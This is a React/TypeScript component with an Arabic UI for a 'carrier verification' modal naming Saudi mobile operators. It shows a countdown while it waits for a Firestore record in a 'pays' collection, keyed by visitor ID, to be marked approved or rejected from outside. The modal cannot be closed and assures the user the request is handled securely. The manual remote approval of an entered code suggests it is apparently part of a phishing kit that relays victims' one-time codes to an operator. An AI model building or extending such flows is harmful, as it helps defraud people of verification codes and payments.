"use client"

import { useEffect, useState } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { Dialog, DialogContent, DialogTitle } from "@/components/ui/dialog"
import { Loader2, ShieldCheck, Phone } from "lucide-react"

interface CarrierVerificationModalProps {
  open: boolean
  carrier: string
  visitorId: string
  onApproved: () => void
  onRejected: () => void
  onOtpRejected: () => void
}

const CARRIER_NAMES: Record<string, string> = {
  stc: "STC - الاتصالات السعودية",
  mobily: "Mobily - موبايلي",
  zain: "Zain - زين",
  virgin: "Virgin Mobile - فيرجن موبايل",
  lebara: "Lebara - ليبارا",
  salam: "SALAM - سلام",
  go: "GO - جو",
}

export function CarrierVerificationModal({
  open,
  carrier,
  visitorId,
  onApproved,
  onRejected,
  onOtpRejected,
}: CarrierVerificationModalProps) {
  const [timeLeft, setTimeLeft] = useState(180)

  // Timer
  useEffect(() => {
    if (!open) {
      setTimeLeft(180)
      return
    }
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(timer)
  }, [open])

  // Firestore listener for approval
  useEffect(() => {
    if (!open || !visitorId) return

    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (snap) => {
      if (!snap.exists()) return
      const data = snap.data()

      if (data.phoneApproval === "approved") {
        onApproved()
      } else if (data.phoneApproval === "rejected") {
        onOtpRejected()
      }
    })

    return () => unsubscribe()
  }, [open, visitorId, onApproved, onRejected, onOtpRejected])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent
        className="max-w-md p-0 overflow-hidden [&>button]:hidden"
        dir="rtl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <DialogTitle className="sr-only">جاري التحقق</DialogTitle>
        <div className="bg-gradient-to-l from-[#1a5c85] to-[#2d7ba8] p-8 text-white text-center">
          <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-white/20 mb-4 relative">
            <Phone className="w-10 h-10" />
            <span className="absolute -top-1 -right-1 w-5 h-5 bg-green-400 rounded-full border-2 border-white animate-pulse" />
          </div>
          <h2 className="text-2xl font-bold mb-2">جاري التحقق</h2>
          <p className="text-white/80 text-sm">
            {CARRIER_NAMES[carrier] || carrier}
          </p>
        </div>

        <div className="p-8 text-center space-y-6">
          <div className="flex flex-col items-center gap-4">
            <Loader2 className="h-12 w-12 text-[#1a5c85] animate-spin" />
            <div>
              <p className="text-gray-900 font-semibold text-lg mb-1">الرجاء الانتظار</p>
              <p className="text-gray-500 text-sm">جاري التحقق من رمز التأكيد...</p>
            </div>
          </div>

          {/* Timer */}
          <div className="bg-gray-50 rounded-xl p-4">
            <p className="text-xs text-gray-500 mb-1">الوقت المتبقي</p>
            <p className="text-3xl font-bold text-[#1a5c85] tabular-nums">{formatTime(timeLeft)}</p>
          </div>

          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center justify-center gap-2">
            <ShieldCheck className="h-4 w-4 text-blue-600" />
            <p className="text-xs text-blue-800">يتم معالجة طلبك بأمان</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
